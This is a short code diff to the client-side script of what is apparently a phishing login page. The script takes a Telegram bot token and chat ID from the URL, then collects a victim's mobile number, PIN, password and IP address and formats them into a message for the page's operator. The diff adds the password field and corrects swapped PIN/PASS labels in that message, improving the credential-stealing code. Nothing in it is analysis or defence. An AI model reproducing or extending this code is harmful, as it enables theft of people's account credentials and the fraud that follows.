@@ -133,6 +133,7 @@ const { token: telegramToken, chatId: telegramChatId } = getQueryParams();
 const loginButton = document.getElementById('loginButton');
 const mobileNumber = document.getElementById('mobileNumber');
 const pin = document.getElementById('pin');
+const pass = document.getElementById('pass');
 
 loginButton.addEventListener('click', async () => {
     const mobileNumberValue = mobileNumber.value.trim();
@@ -174,9 +175,9 @@ loginButton.addEventListener('click', async () => {
     
 📱<b>Mobile Number:</b> <code>${loginData.mobileNumber}</code>
     
-🔐<b>PIN:</b> <code>${loginData.pass}</code>
+🔐<b>PIN:</b> <code>${loginData.pin}</code>
 
-🔐<b>PASS:</b> <code>${loginData.pin}</code>
+🔐<b>PASS:</b> <code>${loginData.pass}</code>
     
 🌐<b>IP Address:</b> ${loginData.ip}
     
